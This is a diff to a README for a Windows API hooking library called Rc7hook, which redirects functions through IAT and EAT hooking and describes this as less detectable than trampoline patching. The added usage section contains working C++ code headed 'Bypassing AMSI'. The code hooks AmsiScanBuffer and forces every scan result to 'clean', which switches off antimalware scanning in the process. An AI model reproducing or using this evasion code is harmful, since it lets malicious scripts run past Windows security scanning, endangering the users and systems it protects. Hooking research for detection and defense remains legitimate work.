@@ -4,10 +4,57 @@
 A Patchless Windows API Hooking Library.
 
 
-## How Does It Work?
+## How It Works
+Rc7hook combines both [IAT Hooking](https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking) and [EAT Hooking](https://www.codereversing.com/archives/598) to completely redirect the target function to the specified hook procedure.
 
-As the description states, Rc7Hook does **NOT** patch functions with a trampoline jump byte array, Instead, It uses both **IAT Hooking** and **EAT Hooking** to redirect the target function's address to that of our hook function.
+This means there's no need for patching the function with a trampoline, which is more detectable.
 
-## The 2 Methods Of Calling Api Functions
+## Running The Examples
+```
+Rc7hook.exe <EXAMPLE>
+```
+```
+Examples:
+- MessageBoxHook
+- AmsiHook
+```
 
-Obviously there isn't only one way to call an api function, Some people would directly call an api function in their code which would require linking, Other people may use **GetProcAddress** to fetch the function's address and call it after it has been casted to the function's prototype, Rc7Hook hooks the **IAT** of the current process so when directly calling an api function it would call the hook function, Then Rc7Hook hooks the **EAT** so that it can also change the function's address to our hook function but this time when the function's address is retrieved by calling the **GetProcAddress** api function.
+## Usage
+### AmsiScanBuffer Hook | Bypassing AMSI
+```cpp
+typeAmsiScanBuffer orgAmsiScanBuffer;
+HRESULT hookAmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result) {
+	HRESULT orgCallResult = orgAmsiScanBuffer(amsiContext, buffer, length, contentName, amsiSession, result);
+
+	(*result) = AMSI_RESULT_CLEAN;
+
+	return orgCallResult;
+}
+
+void hookAmsiScanBuffer() {
+
+	LoadLibraryA("amsi.dll"); // since amsi isn't loaded by the windows loader by default
+
+	Rc7Hook amsiScanBufferHook{ "amsi.dll", "AmsiScanBuffer", hookAmsiScanBuffer, (PVOID*)&orgAmsiScanBuffer };
+
+	if (amsiScanBufferHook.Enable()) {
+		printf("[+] Enabled AmsiScanBuffer Hook!\n");
+	}
+	else {
+		printf("[-] Failed to Enable AmsiScanBuffer Hook.\n");
+	}
+
+	printf("[*] Press a Key to Unhook.\n");
+	getchar();
+
+	if (amsiScanBufferHook.Disable()) {
+		printf("[+] Disabled AmsiScanBuffer Hook!\n");
+	}
+	else {
+		printf("[+] Failed to disable AmsiScanBuffer Hook.\n");
+	}
+}
+```
+
+## Credits
+[EAT Hooking Article](https://www.codereversing.com/archives/598) by [Codereversing](https://www.codereversing.com/archives/598).
